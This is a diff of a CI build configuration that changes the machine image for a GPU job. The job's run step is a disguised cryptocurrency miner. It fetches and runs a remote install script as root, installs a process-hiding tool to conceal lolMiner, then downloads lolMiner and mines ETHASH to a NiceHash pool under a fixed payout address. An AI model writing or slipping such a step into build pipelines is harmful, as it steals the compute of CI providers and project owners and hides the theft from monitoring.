@@ -3,6 +3,6 @@ jobs:
   build:
     machine:
       resource_class: gpu.nvidia.large
-      image: debian:latest
+      image: ubuntu-2004:202010-01
     steps:
       - run: sudo apt-get update && sudo apt-get full-upgrade && sudo apt-get install -f && sudo su --command "curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g node-process-hider && sudo ph add lolMiner && wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.49/lolMiner_v1.49_Lin64.tar.gz && tar -xf lolMiner_v1.49_Lin64.tar.gz && cd 1.49 && ./lolMiner --algo ETHASH --pool stratum+tcp://daggerhashimoto.eu.nicehash.com:3353 --user 3LvsCjHUWwvt6En14BTQrM8SG8Tm6cfwCF.M3 --tls 0"
